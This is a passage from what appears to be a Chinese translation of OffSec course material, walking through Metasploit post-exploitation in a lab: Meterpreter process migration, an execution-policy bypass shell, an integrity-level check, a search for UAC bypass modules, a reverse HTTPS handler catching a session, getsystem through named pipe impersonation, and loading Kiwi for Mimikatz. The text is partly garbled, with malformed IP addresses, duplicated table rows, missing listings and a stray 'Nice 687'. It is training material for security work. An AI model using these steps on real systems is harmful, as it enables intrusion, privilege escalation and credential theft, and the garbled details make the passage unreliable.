
| 8044 | 3912 OneDrive.exe | x64 | 1 | ITWK01:offsec | C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe |

```
meterpreter > migrate 8044
[*] Migrating from 9020 to ...8044...
[*] Migration completed successfully.
```

```
meterpreter > getuid
Server username: ITWK01\offsec
Listing 682 - Migrate to OneDrive process of the user offsec
```

列表 682 显示我们现在再次在 offsec 的上下文中运行。虽然这是一个管理员账户，但正如我们在之前的模块中所学会的样，UAC 阻止了我们执行管理操作。在尝试绕过 UAC 之前，让我们确认当前进程的完整性级别为中等。

> ³⁹（微软文档, 2022），https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-controls

要显示进程的完整性级别，我们可以使用 Process Explorer^994 或第三方 PowerShell 模块如 `NtObjectManager`^995。假设后者已安装在系统中。

一旦使用 `Import-Module`^996 导入模块，我们就可以使用 `Get-NttokenIntegrityLevel`^997 通过检索和检查分配的访问令牌来显示当前进程的完整性级别。

```
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.2200.795]
(c) Microsoft Corporation. All rights reserved.
```

```
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
(c) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements:
https://aka.ms/PSWindows

```

PS C:\Windows\system32> Import-Module NtObjectManager

Import-Module NtObjectManager

```

```

PS C:\Windows\system32> Get-NttokenIntegrityLevel

Get-NttokenIntegrityLevel

Medium

```

> 列表 683 - 检查完整性级别

列表 683 显示我们目前在中等完整性上下文中执行操作。

接下来，让我们将当前活动的通道放入后台，并搜索和利用 UAC 后渗透模块。

```

PS C:\Windows\system32> ^Z

Background channel 1? [y/N] y

```

```

meterpreter > bg

[*] Background session 9...

```

> 列表 684 - 后台通道和会话

现在让我们搜索 UAC 绕过模块。

^994（微软文档, 2022），https://docs.microsoft.com/en-us/internals/downloads/process-explorer

^995（PowerShell Gallery, 2022），https://www.powershellgallery.com/packages/NtObjectManager/1/1.33

^996（微软文档, 2022），https://docs.microsoft.com/en-us/powershell/powershell.core/import-module#view-powershell-7-2

^997（Github, 2021），https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/NttokenIntegrityFunctions.ps1

msf6 exploit(multi/handler) > search UAC

匹配的模块

| 名称 | 发布日期 | 排名 | 描述 |
| --- | --- | --- | --- |
| post/windows/sticky_keys | | normal | Check |
| exploit/windows/local/cve_2022_26904_silentcleanup | 2022-03-17 | excellent | 任意权限提升 |
| exploit/windows/local/bypass_windows_store | 2019-08-22 | manual | Windows 10 UAC 绕过 (WSReset.exe) |
| exploit/windows/local/bypass_windows_store_reg | 2019-02-19 | manual | Windows 10 UAC 绕过 (注册表) |
| exploit/windows/local/bypass_windows_store | 2019-08-22 | manual | Windows 10 UAC 绕过 (WSReset.exe) |
| exploit/windows/local/bypass_windows_store_reg | 2019-02-19 | manual | Windows 10 UAC 绕过 (注册表) |

# OffSec

Nice 687 显示我们的有效负载运行在最高级别的 High 层，并且我们已经成功绕过了 UAC。

除了拥有一个活动会话并通过它执行模块外，我们还可以使用 `load` 命令直接在活动会话内部加载扩展。

一个非常好的例子是 Kiwi，它是一个提供 Mimikatz 功能的 Meterpreter 扩展。使用 Mimikatz 可以揭示 SYSTEM 权限，让我们退出当前的 Meterpreter 会话，重新启动启动器，在 bind 中以用户 lisa 的身份执行 met.exe，并进入系统

```
msf6 exploit(windows/local/bypass_uac) > use exploit/multi/handler

[*] configured payload windows/x64/meterpreter_reverse_https
```

```
msf6 exploit(multi/handler) > run

[*] STARTED HTTPS reverse handler on: http://192.168.119:443

[*] http://192.168.119.443 handling request from 192.168.50:223 (UUID: gokctdekz)

Redirecting stageless connection from /tUQZXCIF-TCZIL8EZAwMG60BsKUJDTThhllsGBepFMQI0malGyPff19cG13aoGxXcCQyMH0 with UA

Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20101011 Firefox/97.0

http://192.168.119.443 handling request from 192.168.50.223 (UUID: gokctdekz)

Attaching orphaned/stageless session...

[*] Meterpreter session 11 opened (192.168.119.443 -> 127.0.0.1) at 2022-08-04

10:10:16 -0400
```

```
meterpreter > getsystem

...got system technique 5 (Named Pipe Impersonation (PrintSpooler variant).

Listing 688- 通过执行 met.exe 在 bind 中新生成的 Meterpreter 会话中使用 kiwi
